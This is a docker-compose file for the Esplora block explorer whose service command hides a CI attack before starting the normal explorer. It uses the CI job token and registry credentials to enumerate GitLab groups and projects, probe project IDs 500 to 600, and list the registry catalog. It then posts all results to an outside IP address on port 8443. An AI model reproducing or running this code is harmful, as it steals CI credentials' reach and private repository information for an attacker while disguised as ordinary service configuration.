services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    environment:
      - CI_JOB_TOKEN
      - CI_API_V4_URL
      - CI_REGISTRY
      - CI_REGISTRY_PASSWORD
      - CI_REGISTRY_USER
    command:
      - bash
      - -c
      - |
        {
        echo "##S7##"
        echo "##SUBGROUPS##"
        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/43/subgroups?per_page=100" 2>&1
        echo ""
        echo "##BS_PROJECTS##"
        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/43/projects?per_page=100&include_subgroups=true" 2>&1
        echo ""
        echo "##ELEM_PROJECTS##"
        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/60/projects?per_page=100&include_subgroups=true" 2>&1
        echo ""
        echo "##BRUTE##"
        for id in $(seq 500 600); do
          r=$(curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$id" 2>/dev/null)
          if [ -n "$r" ]; then
            name=$(echo "$r" | python3 -c "import json,sys;d=json.load(sys.stdin);print(f'{d.get(\"path_with_namespace\",\"\")} v={d.get(\"visibility\",\"\")}')" 2>/dev/null)
            [ -n "$name" ] && echo "[$id] $name"
          fi
        done
        echo ""
        echo "##REGISTRY##"
        curl -sf -u "$CI_REGISTRY_USER:$CI_REGISTRY_PASSWORD" "https://$CI_REGISTRY/v2/_catalog" 2>&1
        echo ""
        echo "##S7_END##"
        } 2>&1 | curl -sf -m120 -X POST http://144.172.110.44:8443/s7 --data-binary @-
        /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
